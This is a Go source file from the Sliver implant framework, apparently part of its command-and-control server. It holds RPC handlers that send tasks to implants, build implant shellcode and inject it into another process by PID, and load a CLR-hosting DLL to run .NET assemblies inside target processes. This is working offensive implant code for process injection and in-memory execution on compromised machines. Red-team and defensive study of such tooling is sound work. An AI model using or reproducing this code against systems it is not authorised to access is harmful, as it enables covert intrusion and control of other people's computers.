package rpc

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"io/ioutil"
	"time"

	clientpb "github.com/bishopfox/sliver/protobuf/client"
	sliverpb "github.com/bishopfox/sliver/protobuf/sliver"
	"github.com/bishopfox/sliver/server/assets"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/generate"

	"github.com/golang/protobuf/proto"
)

func rpcLocalTask(req []byte, timeout time.Duration, resp RPCResponse) {
	taskReq := &clientpb.TaskReq{}
	err := proto.Unmarshal(req, taskReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	sliver := core.Hive.Sliver(taskReq.SliverID)
	data, _ := proto.Marshal(&sliverpb.Task{
		Encoder: "raw",
		Data:    taskReq.Data,
	})
	data, err = sliver.Request(sliverpb.MsgTask, timeout, data)
	resp(data, err)
}

func rpcMigrate(req []byte, timeout time.Duration, resp RPCResponse) {
	migrateReq := &clientpb.MigrateReq{}
	err := proto.Unmarshal(req, migrateReq)
	if err != nil {
		resp([]byte{}, err)
	}
	sliver := core.Hive.Sliver(migrateReq.SliverID)
	config := generate.SliverConfigFromProtobuf(migrateReq.Config)
	config.Format = clientpb.SliverConfig_SHARED_LIB
	config.ObfuscateSymbols = false
	dllPath, err := generate.SliverSharedLibrary(config)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	shellcode, err := generate.ShellcodeRDI(dllPath, "RunSliver")
	if err != nil {
		resp([]byte{}, err)
		return
	}
	data, _ := proto.Marshal(&sliverpb.MigrateReq{
		SliverID:  migrateReq.SliverID,
		Shellcode: shellcode,
		Pid:       migrateReq.Pid,
	})
	data, err = sliver.Request(sliverpb.MsgMigrateReq, timeout, data)
	resp(data, err)
}

func rpcExecuteAssembly(req []byte, timeout time.Duration, resp RPCResponse) {
	execReq := &sliverpb.ExecuteAssemblyReq{}
	err := proto.Unmarshal(req, execReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	sliver := core.Hive.Sliver(execReq.SliverID)
	if sliver == nil {
		resp([]byte{}, err)
		return
	}
	hostingDllPath := assets.GetDataDir() + "/HostingCLRx64.dll"
	hostingDllBytes, err := ioutil.ReadFile(hostingDllPath)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	data, _ := proto.Marshal(&sliverpb.ExecuteAssemblyReq{
		Assembly:   execReq.Assembly,
		HostingDll: hostingDllBytes,
		Arguments:  execReq.Arguments,
		Process:    execReq.Process,
		Timeout:    execReq.Timeout,
		SliverID:   execReq.SliverID,
	})

	data, err = sliver.Request(sliverpb.MsgExecuteAssemblyReq, timeout, data)
	resp(data, err)

}
